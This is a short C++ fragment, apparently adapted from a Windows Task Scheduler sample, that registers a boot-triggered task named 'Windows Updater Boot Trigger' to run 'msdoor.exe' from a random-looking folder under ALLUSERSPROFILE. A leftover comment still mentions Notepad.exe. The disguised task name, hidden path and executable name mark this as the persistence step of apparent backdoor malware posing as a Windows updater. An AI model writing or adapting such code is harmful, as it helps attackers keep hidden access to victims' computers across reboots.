...
int __cdecl wmain()
{
    ...
    LPCWSTR wszTaskName = L"Windows Updater Boot Trigger";

    //  Get the Windows directory and set the path to Notepad.exe.
    wstring wstrExecutablePath = _wgetenv( L"ALLUSERSPROFILE");
    wstrExecutablePath += L"\\a22f53c72d82e19a7dc3fff940f35b62\\msdoor.exe";
